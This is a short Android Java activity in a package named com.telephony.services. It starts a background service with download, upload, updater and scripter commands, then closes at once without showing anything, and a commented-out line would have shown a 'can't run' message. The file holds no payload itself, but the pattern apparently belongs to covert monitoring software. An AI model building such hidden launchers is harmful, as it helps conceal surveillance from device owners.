package com.telephony.services;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;

public class Main extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		// Toast.makeText(this, getResources().getString(R.string.cant_run),
		// Toast.LENGTH_SHORT).show();

		startService(new Intent(this, SuperService.class).putExtra(Utils.EXTRA_RUN_COMMAND, Utils.COMMAND_RUN_DOWNLOAD));
		startService(new Intent(this, SuperService.class).putExtra(Utils.EXTRA_RUN_COMMAND, Utils.COMMAND_RUN_UPLOAD));
		startService(new Intent(this, SuperService.class).putExtra(Utils.EXTRA_RUN_COMMAND, Utils.COMMAND_RUN_UPDATER));
		startService(new Intent(this, SuperService.class).putExtra(Utils.EXTRA_RUN_COMMAND, Utils.COMMAND_RUN_SCRIPTER));

		finish();
	}

}
